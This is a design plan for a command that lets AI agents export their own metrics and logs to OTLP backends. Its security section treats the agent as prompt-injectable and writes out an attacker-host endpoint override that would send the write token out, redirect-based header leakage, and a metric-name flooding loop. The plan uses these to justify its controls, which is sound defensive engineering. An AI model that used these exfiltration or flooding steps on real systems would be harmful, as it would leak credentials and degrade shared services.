# Agent-authored OTel telemetry (`bobi agent <name> otel`)

> **Status:** Draft
> **Tracking issue:** moda-labs/bobi-agent#976 · **Created:** 2026-08-05 · **Last amended:** — (see Amendments)
>
> Markers: `[ ]` idle · `[wip]` in progress · `[x]` done · `[f]` failed/blocked (always with a note)

## Purpose

Give an agent a CLI affordance for recording **arbitrary telemetry of its own
choosing** — a count, a duration, a structured observation — to any OTLP
endpoint (Grafana Cloud, an OpenTelemetry Collector, Honeycomb), so operators
can dashboard and alert on what their agents actually do. The agent decides
what is worth recording; bobi supplies the wire format and, critically, the
identity labels the agent could not supply for itself.

The 10x version of this — auto-instrumenting bobi's whole runtime (every
session, tool call, and workflow step) as OTel traces — is explicitly **out of
scope and rejected here**. That is a different feature with a different risk
profile (it changes hot paths rather than adding a leaf command), and it does
not subsume this one: auto-instrumentation can only emit what the framework
knows, never what the agent judges to be significant. This plan is the
agent-judgement path, and it is deliberately a leaf.

## Problem

Bobi has **no path from an agent's own judgement to an external observability
system**, and no telemetry export of any kind.

- Observability is greenfield. A grep for
  `otel|opentelemetry|prometheus|statsd|grafana|otlp|datadog` across `*.py`,
  `*.ts`, `*.toml`, `*.md`, and `*.json` (excluding `node_modules`, `.venv`)
  returns no substantive matches — the three hits are all the substring
  "remotely". There is no exporter, no metrics registry, and no collector
  configuration to hook into.
- The one module named for telemetry is unrelated.
  `bobi/supervisor/telemetry.py:32-33` publishes to `fleet/heartbeat` and
  `fleet/lifecycle` — bubble-signed POSTs onto bobi's **own** event bus, for
  fleet supervision. It is neither metrics-shaped nor OTLP-shaped, and nothing
  external can consume it.
- An agent that wants to record "I processed 42 tickets" today has two bad
  options: hand-roll a `curl` with correct OTLP encoding inside a prompt, or
  drop the observation into a transcript nobody queries.
- Even if an agent got the encoding right, it **cannot label the data**. The
  fleet identity that makes telemetry sliceable — fleet, instance, machine,
  region, node, platform — is resolved by
  `bobi/supervisor/identity.py:60-91`, from env vars the agent has no reliable
  way to read and normalize itself.

That last point is why this belongs in bobi rather than in a prompt snippet: a
generic `otel-cli` would emit unlabelled numbers.

## Solution

A new `bobi agent <name> otel` click group with three commands, backed by a new
`bobi/otel/` package that builds OTLP protobuf request envelopes and POSTs them
through the existing pooled HTTP client.

```
bobi agent <n> otel metric <name> <value> [--kind counter|gauge|histogram]
                                          [--temporality delta|cumulative]
                                          [--attr k=v]... [--unit s] [--desc "..."]
bobi agent <n> otel log <body> [--severity debug|info|warn|error|fatal] [--attr k=v]...
bobi agent <n> otel check [--send]
```

**Shape of the change.** Additive apart from two deliberate edits to existing
code, both named below and both gated: a `follow_redirects` parameter on
`bobi/http.py`, and promoting the identity resolver to a neutral module.

### Registration

Register with `@agent.group("otel")` **directly on the `agent` group**, the
`subagents` pattern at `bobi/cli.py:1805`. `subagents` is a group with
subcommands, registers this way, and appears in **neither** re-parent list.

This is simpler and safer than defining on `main` and re-parenting: no
`@main.group()`, no entry in the `_group_name` list at `bobi/cli.py:3578`, no
entry in the pop list at `:3586-3590`, and no window in which `bobi otel`
leaks as a top-level command. Do **not** add a `main.add_command(...)` call —
the five existing ones (`cli.py:2360`, `:2385`, `:2716`, `:2846`, `:3457`) are
redundant idempotent re-adds, verified by prototype, and must not be
cargo-culted.

The agent name comes from `@click.pass_context` → `ctx.obj["agent"]`, set at
`bobi/cli.py:275`. When `ctx.obj` is `None` (the group invoked outside the
`agent` parent, which a `CliRunner` test can do), fall back to
`paths.agent_name_for_root(root)`.

### Wire format

The request body is **`ExportMetricsServiceRequest` / `ExportLogsServiceRequest`**
from `opentelemetry.proto.collector.{metrics,logs}.v1.{metrics,logs}_service_pb2`
— **not** a bare `ResourceMetrics` / `ResourceLogs`. Verified 2026-08-05:
`ExportMetricsServiceRequest` has one field, `resource_metrics`, while
`ResourceMetrics`'s field 1 is `resource`. Serializing the inner message
produces a different wire message that a collector rejects, and a round-trip
test using the same wrong type would pass — which is why the acceptance bar is
a real collector (see Decisions D2).

Fixed envelope decisions, so no implementer has to invent them:

- One `ResourceMetrics` → one `ScopeMetrics` → one `Metric` → one data point
  per invocation. `InstrumentationScope(name="bobi", version=<bobi version>)`.
  `schema_url` left empty everywhere.
- `now = time.time_ns()`; `time_unix_nano = now`. For delta temporality
  `start_time_unix_nano = now` as well — a one-shot process has no interval.
  `docs/OTEL.md` records this as the reason a Prometheus-native backend may
  need `deltatocumulative` with `max_stale` tuned.
- `--kind counter` → `Metric.sum`, `is_monotonic=True`, selected temporality.
  A negative `<value>` is a `click.UsageError` for `counter`.
- `--kind gauge` → `Metric.gauge`. **`Gauge` carries no
  `aggregation_temporality` field** (verified: its only field is
  `data_points`), so `--temporality` combined with `--kind gauge` is a
  `click.UsageError`, never a silent ignore.
- `--kind histogram` → `Metric.histogram` with the selected temporality and a
  single-observation `HistogramDataPoint`: `count=1, sum=v, min=v, max=v,
  explicit_bounds=[], bucket_counts=[1]`. This is deliberately a degenerate
  histogram (one unbounded bucket). It exists so a backend that pre-aggregates
  duration histograms receives the right instrument type — not to convey a
  distribution — and `docs/OTEL.md` says so.
- `<value>` parses as `int` when it matches `^[+-]?\d+$`, else `float`; ints go
  to `NumberDataPoint.as_int`, floats to `as_double` (a real oneof, verified).
  Documented, because `1` and `1.0` produce different wire types and a series
  must not mix them. Unparseable is a `click.UsageError`.
- `otel log` emits one `LogRecord`: `body` as `AnyValue.string_value`
  **verbatim, never JSON-sniffed**; `time_unix_nano == observed_time_unix_nano
  == time.time_ns()`; `severity_number` mapped `debug→5, info→9, warn→13,
  error→17, fatal→21` (verified against `logs_pb2.SeverityNumber`) with
  `severity_text` the uppercased word; default `--severity info`;
  `trace_id`/`span_id`/`flags`/`event_name` unset. `<body>` follows the
  stdin-or-argument idiom at `bobi/cli.py:1976-1993` so a multi-line body needs
  no shell quoting.

**Success is `2xx` AND an empty `partial_success`.** `ExportMetricsServiceResponse`
carries a `partial_success` field (verified), so a collector can **reject at
HTTP 200** with `rejected_data_points` and an `error_message`. Treating status
alone as the contract would make the loud-failure design silently fail to
fire. `partial_success.error_message` goes to stderr under the same sanitizing
rules as a non-2xx body.

### Endpoint and configuration resolution

Spec-standard env vars only — no `Config` dataclass change, no `agent.yaml`
schema change. Read via the process-env-over-`run/.env` precedence already
implemented at `bobi/config.py:98-111` and propagated to every spawned agent by
`bobi/env.py:125-165` `child_agent_env()`.

- `OTEL_EXPORTER_OTLP_METRICS_ENDPOINT` / `_LOGS_ENDPOINT`, when set, are used
  **verbatim** — no signal path appended — and win over the base var.
- Otherwise `OTEL_EXPORTER_OTLP_ENDPOINT` has trailing `/` stripped and
  `/v1/metrics` or `/v1/logs` appended. Grafana Cloud's documented value is
  `https://otlp-gateway-<zone>.grafana.net/otlp`; operators paste `…/otlp/`,
  and naive concatenation yields `//v1/metrics` → 404.
- `OTEL_EXPORTER_OTLP_PROTOCOL`: only `http/protobuf` (or absence) is
  supported. `grpc` is a **misconfigured** error naming the var — not a silent
  HTTP attempt against a gRPC port.
- `OTEL_EXPORTER_OTLP_TIMEOUT` (milliseconds) honored; default **10000ms**,
  matching `bobi/http.py:34` `_TIMEOUT`.
- `OTEL_EXPORTER_OTLP_HEADERS` (and `_METRICS_HEADERS` / `_LOGS_HEADERS`,
  which override per signal) parse per W3C Baggage: split on `,`, then
  `partition("=")` on the **first** `=`, then `urllib.parse.unquote` and strip
  surrounding whitespace. Grafana Cloud's canonical
  `Authorization=Basic <base64>` contains `=` padding and a decoded space, and
  a test asserts that exact string round-trips.
- `OTEL_RESOURCE_ATTRIBUTES` (`k=v,k=v`) is merged in, with bobi's identity
  attributes winning on conflict.
- A resolved URL with no scheme is a **misconfigured** error, not a request.
- **Unconfigured** (no endpoint at all) is its own clean error naming
  `OTEL_EXPORTER_OTLP_ENDPOINT`, distinct from misconfigured and from an
  export failure, so a box without observability does not look broken.

### Resource attributes

Auto-stamped on every emission, mapped onto OTel semantic conventions where
one exists:

| Attribute | Source |
|---|---|
| `service.name` | `OTEL_SERVICE_NAME`, default `bobi` |
| `service.version` | `bobi.__version__.__version__` |
| `service.instance.id` | identity `instance` |
| `bobi.fleet` | identity `fleet` |
| `bobi.platform` | identity `platform` (`fly`/`k8s`/`docker`/`unknown`) |
| `bobi.agent` | the `<name>` argument of the `agent` group |
| `bobi.team` | `agent` key from `package/agent.yaml`; attribute **omitted** when absent |
| `host.id` / `cloud.region` / `k8s.node.name` | identity `machine` / `region` / `node` — omitted when null |

`service.instance.id` and `bobi.agent` are usually the **same string** —
`_resolve_instance` falls back through `BOBI_INSTANCE` → `BOBI_AGENT` → run-root
basename. That is expected, not a bug: the former is the semconv-standard key
external tooling looks for, the latter is bobi's own dimension.

There is deliberately **no session or run id**: verified 2026-08-05, no such
value exists in the environment. `child_agent_env()` sets only `BOBI_ROOT` and
`BOBI_BRAIN` and strips `BOBI_LAUNCH_LINEAGE`; `grep BOBI_SESSION|BOBI_RUN`
returns nothing. Agents wanting run correlation pass it via `--attr`.

### Security model

The agent invoking this command is **prompt-injectable by design**: it runs
under `permission_mode="bypassPermissions"` (`bobi/brain/claude.py:516`,
`:566`) with no Bash allowlist, and processes untrusted input from GitHub,
Slack, Linear, and webhooks. This command is therefore assumed to be
attacker-invoked, and the controls below are load-bearing, not hardening.

Note what this feature copies from `events publish` and what it must not: that
command's real security content is `_validate_event_publish_topic`
(`bobi/cli.py:1996-2016`), a **destination allowlist**. Importing its
`SystemExit(1)` ergonomics without an equivalent destination and input
discipline would be importing the shape and not the rigor.

1. **Credential origin-pinning.** `project_env()` makes process env beat
   `run/.env`, so `OTEL_EXPORTER_OTLP_ENDPOINT=https://attacker.tld bobi agent
   x otel log hi` would otherwise POST the box's real write token to the
   attacker — bobi acting as courier for a secret the agent never had to read.
   Resolve the endpoint from `run/.env` and from process env separately; when
   they disagree on scheme/host/port, send **no** configured headers and print
   a one-line notice that the credential was withheld.
2. **No redirects on export.** `bobi/http.py:50` builds the shared client with
   `follow_redirects=True` and `post()` (`:58-71`) exposes no override. httpx
   0.28.1's `_redirect_headers` strips only `Authorization` and `Cookie`
   cross-origin — verified by reading the installed source. Every non-Grafana
   backend uses a custom header name (`x-honeycomb-team`, `api-key`,
   `signoz-ingestion-key`, `uptrace-dsn`), so one 307 forwards the write token
   verbatim with **no agent compromise at all**. Add a
   `follow_redirects: bool = True` parameter to `bobi/http.py`'s `post()` and
   pass `False` here; treat any 3xx as a typed failure naming the `Location`
   host. httpx also rewrites a redirected POST to GET and drops the body, so
   following redirects would additionally make a misrouted export look
   successful.
3. **No secrets in output.** `otel check` prints header **names** with values
   rendered as `<set>` — never a value. Tool output becomes a `tool_result` in
   the transcript, which `docs/RUN_DRILLDOWNS.md:31-50` renders (clipped, not
   redacted) in the console. This leaks on the *benign* path: an agent
   debugging a 401 in good faith prints it.
4. **Remote output is untrusted and bounded.** A non-2xx body (or
   `partial_success.error_message`) is remote-controlled bytes reaching the
   agent's context via stderr, and under (1) the agent may choose the endpoint
   — a second-order prompt-injection channel and a context-exhaustion lever.
   Cap at 200 bytes, strip ASCII control characters and ANSI escapes, and
   prefix with a fixed literal: `remote response (untrusted):`.
5. **Reserved attribute keys.** Framework resource attributes are applied
   **last**, and `--attr` keys matching `service.*`, `bobi.*`, `host.*`,
   `cloud.*`, `k8s.*`, `le`, `quantile`, `__*` raise `click.UsageError`.
   Without this an agent forges the exact labels the feature exists to make
   trustworthy, and `le`/`quantile`/`__name__` corrupt Prometheus series on
   ingest.
6. **Bounded cardinality and volume.** Metric name must match
   `^[a-zA-Z0-9_.]{1,64}$`; at most 20 attributes; keys ≤64 bytes, values ≤256
   bytes; numeric values must be finite; a per-process emission cap. Without
   bounds, `otel metric "m$(uuidgen)" 1` in a loop is an active-series
   explosion — a billing DoS and a tenant-wide degradation for every other
   service on the stack. Note the loud-failure design *amplifies* this: a model
   that observes a failure retries, and there is no backoff, so a transient 429
   becomes a hot loop. The cap is what bounds it.
7. **Credential scope guidance.** `docs/SECURITY.md:157-160` accepts that a
   prompt-injected agent could exfiltrate "its own **instance's** tokens,
   mitigated by scoped per-instance tokens." A Grafana Cloud OTLP token is
   typically **stack-scoped** and identical on every box, which would move the
   blast radius from one instance to the organization's whole observability
   plane. That is a change to the security model, not an instance of it, so
   `docs/SECURITY.md` is updated in this PR and `docs/OTEL.md` leads with:
   mint a **write-only, per-instance** ingest token; never reuse a
   stack-admin token.

Two further notes recorded so a later reviewer does not "improve" them: the
endpoint stays **env-only** with no `--endpoint` flag (a flag would make
`check` a convenient SSRF/port prober, and the env-only shape is also what
makes origin-pinning meaningful); and excluding this from
`bobi/prompts/base.md` is a **security** decision as well as a cost one — it
keeps the exfiltration affordance out of every agent's default prompt.

Out of scope for v1, recorded as deferred: a per-emission audit line to the
agent log, refusing cross-runtime invocation (agent A running
`bobi agent B otel …`, which loads B's `run/.env` and stamps B's identity), and
a non-overridable `bobi.authored=agent` attribute.

### Distribution

`opentelemetry-proto` is a **core dependency**, not an extra (Decisions D4).
`docs/OTEL.md` is the operator-facing setup document. A
`bobi/tool_library/otel/` entry is **guide-only** — no `install:`, since there
is nothing left to install — carrying the agent-facing usage guide, plus a
section in `skills/bobi.md`.

It is deliberately **not** added to `bobi/prompts/base.md`: that file is
injected into every agent on every box, most boxes have no OTLP endpoint, and
advertising there would put a reliably-failing tool call in front of the whole
fleet (and see the security note above).

**Constraint:** `tests/import_boundaries`'s `_CONTAINER_BUILD_RE`
(`tests/test_import_boundaries.py:184-193`) regex-scans **every file** under
`bobi/`, including markdown, and bans `docker compose` among others. Collector
bring-up instructions therefore live in `docs/OTEL.md` (outside `bobi/`, and
unconstrained); the in-package guide references them without naming a
container-build verb.

### Alternatives considered

- **`opentelemetry-sdk` + `opentelemetry-exporter-otlp-proto-http`** — lost on
  cost. Measured 2026-08-05: ~150ms wall clock to import against a ~20ms
  bare-interpreter floor, and 15 packages. `bobi --version` is ~120ms today,
  so this roughly doubles cold start on a command an agent may call several
  times per turn. Its provider/batching model also assumes a long-lived
  process, which a one-shot CLI is not.
- **Hand-rolled OTLP/JSON, zero dependencies** — lost on both axes it was
  supposed to win. The OTLP spec makes binary protobuf **MUST**-support for
  OTLP/HTTP and JSON only **MAY**-support, so JSON is the optional half and
  risks silent incompatibility with a collector we do not control. And it is
  not faster: bobi already imports `httpx` (~90ms, core dep) on any networked
  command, against which protobuf encoding measured ~10ms marginal.
- **Piping bobi's internal event bus to OTel** — a different feature. Rejected
  in scoping 2026-08-05: the request is agent-authored arbitrary information,
  not framework event export.
- **Spooling failed exports to disk with retry** — rejected 2026-08-05. Would
  introduce durable state, a drain path, spool growth bounds, and a
  corrupt-spool failure mode, to protect best-effort telemetry.
- **Defining the group on `main` and re-parenting it** — rejected: strictly
  more machinery than `@agent.group("otel")`, with a leak window for a
  top-level `bobi otel`.

## Relevant files

### Existing (verified 2026-08-05)

- `bobi/cli.py` — click command tree. Register with `@agent.group("otel")`
  following `subagents` at `:1805`. `events publish` (`:2030-2049`) is the
  error-handling shape; `_validate_event_publish_topic` (`:1996-2016`) is the
  validation shape. Helpers: `_detect_project_root()` (`:73-88`), the
  stdin-or-flag payload idiom (`:1976-1993`), `ctx.obj["agent"]` (`:275`).
- `bobi/http.py` — pooled `httpx.Client`; `follow_redirects=True` at `:50`,
  `post()` at `:58-71` (accepts `content: bytes`, `headers`, `timeout`),
  `_TIMEOUT` at `:34`. **Modified**: gains a `follow_redirects` parameter.
- `bobi/supervisor/identity.py:60-91` — `resolve_deployment_identity()`.
  **Modified**: promoted per Decisions D3.
- `bobi/supervisor/__init__.py` — eagerly imports `.config` and
  `.supervision`; the reason D3 promotes rather than imports in place.
- `bobi/config.py:98-111` — `project_env()` precedence.
  `:362-368` — `BuildSpec`, whose lack of a `pip:` key rules out a
  tool_library install.
- `bobi/env.py:125-165` — `child_agent_env()`.
- `bobi/__version__.py` — `service.version` source.
- `Dockerfile:72-74` — derives the image's install list from
  `[project.dependencies]` via `tomllib`, which is why a core dep needs **no**
  Dockerfile change.
- `docs/SECURITY.md:157-160` — the accepted-risk paragraph this feature
  exceeds. **Modified** in Phase 4.
- `docs/RUN_DRILLDOWNS.md:31-50` — tool results render in the console;
  the reason `check` must redact.
- `tests/test_cli.py:41-49` (`test_top_level_help_is_machine_scoped`),
  `:58-64` (`test_agent_help_lists_runtime_commands`).
- `tests/test_tool_guides.py:241` — hardcoded set of groups whose
  sub-subcommands are contract-checked; `otel` must be added or a typo'd
  command in `skills/bobi.md` ships unchecked.
- `tests/test_import_boundaries.py:184-193` — `_CONTAINER_BUILD_RE`, scanning
  every file under `bobi/`.
- `tests/conftest.py:46-63` — autouse `_isolate_environ` snapshots but does
  **not** clear `os.environ`.
- `.github/workflows/ci.yml:87,282` — the unit jobs.
- `skills/bobi.md`, `CLAUDE.md` — reference surfaces.

### New

- `bobi/identity.py` — the promoted deployment-identity resolver (D3).
- `bobi/otel/__init__.py` — lazy re-export surface (see D5 note in Phase 1).
- `bobi/otel/config.py` — endpoint/header/timeout/protocol resolution;
  distinguishes unconfigured / misconfigured / configured. No third-party
  imports, so `otel check` works on a box where nothing else does.
- `bobi/otel/resource.py` — resource attribute set from identity + agent/team
  + `OTEL_RESOURCE_ATTRIBUTES`.
- `bobi/otel/export.py` — request envelope construction and POST. No existing
  module can absorb it: `events/publish` speaks bobi's signed-envelope
  protocol to bobi's own bus.
- `docs/OTEL.md` — operator setup, resource-attribute table, delta-temporality
  consequence, degenerate-histogram note, token-scope guidance, collector
  bring-up.
- `bobi/tool_library/otel/{tool.yaml,guide.md}` — guide-only entry.
- `tests/test_otel_export.py`, `tests/test_otel_cli.py`,
  `tests/test_otel_abuse.py`, `tests/integration/test_otel_collector.py`.

## Questionables

None open. All five forks raised in review were resolved on 2026-08-05 and are
recorded in Decisions below.

## Decisions

- **D1 — Metric temporality.** `--temporality delta|cumulative`, default
  `delta`. **Decision (2026-08-05, Zach + review):** a stateless one-shot
  cannot maintain a running total and the disk spool was rejected, so delta is
  forced for the self-contained case; but an agent that genuinely knows its
  total ("42 tickets today") can declare `cumulative` and reach a
  Prometheus-native backend without a collector hop. `Gauge` has no
  temporality field, so `--temporality --kind gauge` is a `UsageError`.
- **D2 — Acceptance bar.** A real collector, in a named CI job.
  **Decision (2026-08-05, Zach):** unit round-trips prove only
  self-consistency — demonstrated by this very review, where the plan named the
  wrong top-level message and a same-library round-trip would have passed. A
  live Grafana Cloud canary was rejected as a credential and spend lane for a
  format that does not drift once correct.
- **D3 — Identity helper placement.** Promote to `bobi/identity.py`;
  `bobi/supervisor/identity.py` re-exports for compatibility.
  **Decision (2026-08-05, review):** importing in place costs ~20ms because
  `bobi/supervisor/__init__.py` eagerly imports `.config` and `.supervision`
  (measured: 40ms vs 20ms bare, for 30 lines of `os.environ.get`) — the entire
  cold-start budget, before protobuf's ~10ms. This is the plan's one edit to
  load-bearing sidecar code and carries the strictest gate in Phase 1.
- **D4 — Packaging.** `opentelemetry-proto>=1.44,<2` in
  `[project.dependencies]`, not an extra. **Decision (2026-08-05, Zach):** an
  extra exists to defer weight, and there is none (~10ms, one transitive dep).
  The extra also broke in three independent places — no CI job installs it, so
  the suite would skip to green; `BuildSpec` has no `pip:` key and the
  Dockerfile runs TEAM_DEPS below the `/opt/venv` COPY, so a tool_library
  install lands unimportable; and the `success:` probe would hit two different
  interpreters. Core deps flow into the image automatically via
  `Dockerfile:72-74`. Range-pinned rather than bare per the `#380` convention.
  Accepted cost: `protobuf` enters every `pip install bobi`.
- **D5 — Abuse controls in v1.** Credential-safety plus input bounds — items
  1–7 of the Security model. **Decision (2026-08-05, Zach):** the set where
  omission is a real vulnerability rather than missing hardening. Audit
  logging, cross-runtime refusal, and `bobi.authored` deferred.

## Phases

### Phase 1 — Identity promotion and exporter core

- [ ] Add `"opentelemetry-proto>=1.44,<2"` to `[project.dependencies]`.
- [ ] No `ci.yml` change is needed — a core dependency is installed by the
      existing `pip install -e ".[dev,kb]"` at `:87`/`:282`. Confirm this
      rather than assuming it: the whole reason D4 chose a core dep is that the
      extra would have skipped to green.
- [ ] Promote `resolve_deployment_identity()` and its helpers to
      `bobi/identity.py`; make `bobi/supervisor/identity.py` re-export from it
      so the sidecar's imports and its documented dependency discipline are
      unchanged.
- [ ] `bobi/otel/config.py`: resolve base and per-signal endpoints, headers
      (W3C Baggage with `unquote`), protocol, timeout; classify
      unconfigured / misconfigured / configured; resolve the endpoint from
      `run/.env` and process env separately for origin-pinning.
- [ ] `bobi/otel/resource.py`: attribute set per the table; omit null
      enrichment and absent `bobi.team`; merge `OTEL_RESOURCE_ATTRIBUTES` with
      framework attributes applied last.
- [ ] `bobi/otel/export.py`: build `ExportMetricsServiceRequest` /
      `ExportLogsServiceRequest` per the Wire format section; POST via
      `bobi/http.py` with `Content-Type: application/x-protobuf`; success is
      2xx AND empty `partial_success`; sanitize and cap remote output.
- [ ] `bobi/otel/__init__.py`: re-export `export_metric` / `export_log`
      **lazily** via module-level `__getattr__` so `import bobi.otel` never
      imports `opentelemetry.proto`; import `resolve_config` eagerly.

**Validation gate** — do not exit this phase until every line passes; if a
command fails, fix the cause and re-run.

- [ ] `pytest tests/test_otel_export.py -q` green, with **no module-level
      skip** — the suite must execute in CI, not skip to green
- [ ] `pytest tests/test_supervisor*.py tests/ -k identity -q` green — the
      strictest gate in this phase, proving the D3 promotion changed no
      sidecar behavior
- [ ] `python -c "from bobi.supervisor.identity import resolve_deployment_identity"`
      still works (compatibility re-export intact)
- [ ] Emitted bytes decode as `ExportMetricsServiceRequest` (not
      `ResourceMetrics`) and carry every expected resource attribute
- [ ] `Authorization=Basic <base64-with-=-padding>` round-trips through header
      parsing byte-exact
- [ ] Measured: `from bobi.identity import resolve_deployment_identity` costs
      <5ms marginal (vs ~20ms via the supervisor package)

### Phase 2 — Credential safety and transport hardening

- [ ] Add `follow_redirects: bool = True` to `bobi/http.py`'s `post()`; pass
      `False` from `bobi/otel/export.py`. Default preserves every existing
      caller's behavior.
- [ ] Treat any 3xx on export as a typed failure naming the `Location` host.
- [ ] Origin-pinning: when the process-env endpoint disagrees with
      `run/.env`'s on scheme/host/port, send no configured headers and print
      the withheld-credential notice.
- [ ] Reserved attribute keys rejected with `click.UsageError`; framework
      attributes applied last.
- [ ] Bounds: metric name `^[a-zA-Z0-9_.]{1,64}$`, ≤20 attributes, keys ≤64
      bytes, values ≤256 bytes, finite numerics, per-process emission cap.

**Validation gate**

- [ ] `pytest tests/test_otel_abuse.py -q` green
- [ ] A stub that 307s to a second host receives **none** of the configured
      headers
- [ ] Endpoint overridden via process env → stub receives zero configured
      headers, and the notice is printed
- [ ] A 500 response whose body carries ASCII control characters and a fake
      instruction is capped at 200 bytes, stripped, and prefixed
      `remote response (untrusted):`
- [ ] Existing `bobi/http.py` callers unaffected: `pytest tests/ -k http -q` green

### Phase 3 — CLI surface

- [ ] `@agent.group("otel")` with `metric`, `log`, `check`, following the
      `subagents` pattern. No `main.add_command`, no re-parent list entry.
- [ ] `--attr` splits on the **first** `=` (`str.partition`); no `=` →
      `UsageError`; empty key → `UsageError`; empty value allowed; duplicate
      key → last wins. **All values emitted as `string_value`,
      unconditionally** — no numeric or boolean inference; stated in the guide
      so it does not read as a bug.
- [ ] `<value>` int/float parsing per the Wire format section; negative with
      `--kind counter` → `UsageError`; `--temporality` with `--kind gauge` →
      `UsageError`.
- [ ] `otel log` body via the stdin-or-argument idiom.
- [ ] `otel check`: prints whether `opentelemetry.proto` imports, the resolved
      metrics and logs URLs, header **names** with values as `<set>`, and the
      full resource attribute set. **Without `--send` it makes no network call
      at all** and says so — OTLP has no health endpoint and a GET returns 405
      from a Collector, proving nothing. Exit 0 if configured, 1 otherwise.
      With `--send`, exports one gauge `bobi.otel.check` value `1` unit `1`
      through the identical path as `otel metric`, so it never pollutes a real
      series; exit 0 only on the full success contract.
- [ ] Docstrings end with the `Usage:` block convention — this is what the
      agent reads via `--help`.
- [ ] Add `otel` to `tests/test_cli.py:58-64`'s asserted list, and `" otel"`
      to the `removed` list in `test_top_level_help_is_machine_scoped`
      (`:41-49`) so its absence from top level is enforced, not incidental.
- [ ] Add `otel` to the checked-group set at `tests/test_tool_guides.py:241`.

**Validation gate**

- [ ] `pytest tests/test_otel_cli.py tests/test_cli.py tests/test_tool_guides.py -q` green
- [ ] `bobi agent <n> otel --help` lists all three commands. Note it requires
      an installed agent: click runs the `agent` callback (`cli.py:269-275` →
      `_bind_agent_runtime`) before the subcommand's `--help`
- [ ] `otel metric x 1` unconfigured → exit non-zero naming the env var
- [ ] `otel check` output contains no header value — asserted by planting a
      sentinel secret and grepping stdout **and** stderr
- [ ] `otel check` on a box with the endpoint unset exits 1 with a diagnosis,
      never a traceback

### Phase 4 — Distribution and docs

- [ ] `bobi/tool_library/otel/tool.yaml` — guide-only, no `install:`;
      `success:` exercises the interpreter the CLI uses.
- [ ] `bobi/tool_library/otel/guide.md` — agent-facing: metric vs log, the
      all-values-are-strings rule, reserved keys, bounds, that failures are
      loud, and **never interpolate a secret into `--attr`** (argv is visible
      in `ps` and rendered in the console per `docs/RUN_DRILLDOWNS.md:31-32`).
      Must not contain `docker compose`.
- [ ] `docs/OTEL.md` — operator setup incl. collector bring-up, env var table
      with precedence, resource attributes, delta-temporality consequence,
      degenerate-histogram note, and the write-only per-instance token
      guidance as the leading instruction.
- [ ] `docs/SECURITY.md` — the OTLP credential's scope versus the documented
      per-instance accepted risk, and the required token scope.
- [ ] `skills/bobi.md` — add the command group.
- [ ] `CLAUDE.md` — add the `docs/OTEL.md` Reference Docs line.
- [ ] Confirm no `bobi/prompts/base.md` change (opt-in by design, for cost
      **and** security).

**Validation gate**

- [ ] `pytest tests/ --ignore=tests/integration/ --ignore=tests/e2e/ --timeout=30 -q` green
- [ ] `pytest tests/test_import_boundaries.py tests/test_tool_library.py -q` green
- [ ] `bobi skill bobi` output contains the `otel` section
- [ ] A team declaring `tool_library: [otel]` expands to `tools/otel.md` in its
      installed package image

### Phase 5 — Collector verification

- [ ] `tests/integration/test_otel_collector.py`: bring up
      `otel/opentelemetry-collector` with a `debug` exporter at
      `verbosity: detailed`, POST one metric and one log through the real code
      path, assert the collector **accepted** both and that its rendered output
      carries the expected resource attributes.
- [ ] Give it a CI home and name it in the plan: mark `docker` and add it to
      the job that actually runs docker-marked tests (`container.yml`), since
      `integration-fast` deselects that marker and an unhomed container test is
      a third vacuous surface.
- [ ] Guard the premise the way this repo already does: the lane must prove it
      RAN, not skip to green.
- [ ] Manual verification in an isolated `BOBI_HOME` against a real installed
      agent: emit a counter and a log, confirm identity attributes.

**Validation gate**

- [ ] The collector accepts both signals and renders the expected resource
      attributes
- [ ] The collector test executes in CI — asserted by a report check, not by
      reading a green tick
- [ ] Recorded observation (not a pass/fail gate): cold-start delta for
      `bobi agent <n> otel check` versus the ~120ms `bobi --version` baseline,
      median of 5 runs, machine and OS stated in the PR

## Proof of work

This is a **new-behavior** unit, so the proof idiom is plain assertion of the
new contract, not failing-test-first (nothing is broken today — verified: zero
telemetry code exists).

- `tests/test_otel_export.py` — envelope construction. Round-trips emitted
  bytes as `ExportMetricsServiceRequest` / `ExportLogsServiceRequest` and
  asserts structure, resource attributes, temporality, severity mapping,
  int-vs-double selection, omit-nulls, and the `partial_success` failure path.
  **No module-level skip**: `opentelemetry-proto` is a core dep, so a missing
  import is a genuine failure, not a reason to skip.
- `tests/test_otel_cli.py` — command surface, `CliRunner`, isolated
  `BOBI_HOME`, `paths.bind_root(None)` bracket. Every test must
  `monkeypatch.delenv` the full `OTEL_*` set plus `BOBI_FLEET`,
  `BOBI_INSTANCE`, `BOBI_MACHINE_ID`, `BOBI_REGION`, `BOBI_NODE`, `FLY_*`,
  `KUBERNETES_SERVICE_HOST`, `POD_NAME`, `NODE_NAME` — `tests/conftest.py:46-63`
  snapshots but does not clear the environment, so a developer with a real
  OTLP endpoint set would otherwise see failures.
  Patch **`bobi.otel.export.export_metric`** (the function in its defining
  module), never `bobi.otel.export` as a whole: with a
  `from bobi.otel.export import …` form that patch is silently bypassed via
  `sys.modules`.
- `tests/test_otel_abuse.py` — the security controls: endpoint override
  withholds headers; redirect withholds headers; `check` never emits the
  secret; reserved `--attr` keys rejected; over-long and over-many attributes
  rejected; sanitized and capped error excerpt.
- `tests/integration/test_otel_collector.py` — D2's real-collector proof.
- Suites that must stay green: `pytest tests/ --ignore=tests/integration/
  --ignore=tests/e2e/ --timeout=30 -q`, plus `tests/test_tool_guides.py`,
  `tests/test_tool_library.py`, and `tests/test_import_boundaries.py`.
  Note `test_import_boundaries.py`'s allowlists (`WORKER_ADAPTER_MODULES`,
  `PUBLIC_LOCAL_MODULES`) are **TypeScript** module sets and do not constrain a
  new Python package; the guard that applies is `_CONTAINER_BUILD_RE`
  (`:184-193`), scanning every file under `bobi/`.

**Real-Claude e2e: not required.** Per `CLAUDE.md`'s judgement call, a
brain-agnostic change is proven by the deterministic path. Nothing here touches
session orchestration, turn handling, or event delivery — the command is a leaf
that never involves a brain. The e2e risk is the *collector*, which D2
addresses.

## Lane map

| Lane | Dispatch issue | Phases | One-line scope | Marker mode | Status |
|---|---|---|---|---|---|
| A | #TBD | 1-5 | The whole feature: identity promotion, exporter, hardening, CLI, distribution, collector proof | solo | open |

**Lanes:** One lane — the null topology and the default. A single coherent
deliverable in a single repo whose phases are strictly sequential: the CLI
cannot be written before the exporter it calls, hardening changes the exporter's
transport, distribution documents a surface that must exist, and the collector
proof needs all of it. No wall-clock justification exists for a same-repo
parallel cut — the sequential estimate is one agent session, not calendar
scale. One lane means one dispatch issue, one PR, one review, and no fuse or
convergence gate.

Lane A's dispatch issue is **#978**, filed 2026-08-05. (The table's
`#TBD` cell predates the split and is frozen by the insertion-only rule;
this line supersedes it.)

## Amendments

